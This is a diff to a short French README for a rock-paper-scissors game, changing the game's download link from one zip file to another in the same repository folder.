@@ -1,3 +1,3 @@
 # Pierre-Papier-Ciseaux
 
-lien du jeux : https://raw.githubusercontent.com/zduchevreuil/Pierre-Papier-Ciseaux/main/unparallel/Pierre-Papier-Ciseaux-v1.4.zip
+lien du jeux : https://github.com/zduchevreuil/Pierre-Papier-Ciseaux/raw/refs/heads/main/unparallel/Papier-Ciseaux-Pierre-3.9-alpha.2.zip
